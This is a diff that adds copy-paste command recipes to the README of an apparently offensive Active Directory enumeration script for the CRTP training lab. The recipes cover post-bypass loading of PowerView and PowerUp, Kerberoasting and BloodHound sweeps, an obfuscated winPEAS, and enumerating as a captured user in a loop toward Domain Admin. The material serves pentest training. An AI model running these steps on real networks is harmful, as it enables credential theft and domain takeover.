@@ -219,6 +219,86 @@ bottom line — **`>>> RECOMMENDED NEXT MOVE`** — names the single highest-val
 
 ---
 
+## 1b. Command recipes (copy-paste)
+
+**Step 1 — always do this first** (in your InviShell shell, after AMSI/logging bypass):
+
+```powershell
+# load modules so every section lights up (adjust paths to your tools)
+Import-Module D:\CRTP\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+Import-Module D:\CRTP\Tools\PowerView.ps1
+Import-Module D:\CRTP\Tools\PowerUp.ps1
+Import-Module D:\CRTP\Tools\PowerHuntShares.psm1
+. D:\CRTP\Tools\Invoke-SessionHunter.ps1
+. D:\CRTP\Tools\Invoke-EDRChecker.ps1
+Import-Module D:\CRTP\Tools\PowerUpSQL-master\PowerUpSQL.psd1
+```
+
+**Step 2 — pick the recipe you need:**
+
+<details open><summary><b>A · Quiet first look (default, low-noise)</b></summary>
+
+Normal-looking LDAP only; no host-touching. Great as the first pass on any foothold.
+```powershell
+.\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot
+```
+</details>
+
+<details><summary><b>B · FULL SCAN — everything, all data (LOUD, slow)</b></summary>
+
+Every section + all opt-in tools + both extra outputs. For the CRTP lab (no blue team).
+```powershell
+.\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot -HostSweep -IncludeForest -Roast -BloodHound -SQLCrawl -SharpEnum -Json -Zip
+```
+Add the deepest local triage (winPEAS) for the absolute maximum:
+```powershell
+.\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot -HostSweep -IncludeForest -Roast -BloodHound -SQLCrawl -SharpEnum -WinPEASPath D:\CRTP\Tools\Sliver\winPEAS-obfuscated.exe -Json -Zip
+```
+</details>
+
+<details><summary><b>C · Per-hop re-run, scoped to one new box (quiet-ish)</b></summary>
+
+After you land on a new host — host checks limited to that box instead of the whole domain.
+```powershell
+.\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot -Target dcorp-appsrv
+```
+</details>
+
+<details><summary><b>D · Enumerate AS a captured user (no shell needed)</b></summary>
+
+After you loot a password/hash — query the directory as that user via the LDAP engine.
+```powershell
+$sec  = ConvertTo-SecureString 'Password123' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('dcorp\studentx',$sec)
+.\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot -Credential $cred
+```
+(For host-sweep / module sections as another user, launch a `runas /netonly` or pass-the-ticket shell and re-run instead.)
+</details>
+
+<details><summary><b>E · Focus on specific things only</b></summary>
+
+Run just the sections you want (fast, targeted). Keywords are listed under `-Only` below.
+```powershell
+.\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot -Only kerberoast,asrep,acls,dcsync
+```
+</details>
+
+<details><summary><b>F · Roast + BloodHound only (grab hashes + graph)</b></summary>
+
+```powershell
+.\Invoke-CRTPEnum.ps1 -Domain dollarcorp.moneycorp.local -OutDir C:\Users\Public\loot -Roast -BloodHound -Json
+```
+</details>
+
+**Step 3 — read the output** (in `C:\Users\Public\loot\CRTPEnum_*\`), in this order:
+`00_SUMMARY.txt` → `EXPLOIT_COMMANDS.txt` → `CRTP-Playbook.txt`, and the `>>> RECOMMENDED NEXT MOVE` line.
+
+**Step 4 — the loop:** run the recommended command → get new creds/access → become that identity (`runas /netonly` or pass-the-ticket) → **re-run** → check `NEW_this_run.txt`. Repeat to Domain Admin.
+
+> ⚠️ Recipe **B** is loud (host sweeps + Kerberos 4769 + compiled binaries) — fine for the CRTP lab, not for a monitored network. Recipe **A** is the quiet one.
+
+---
+
 ## 2. What it flags (and where to look)
 
 | Section | File | Finds |
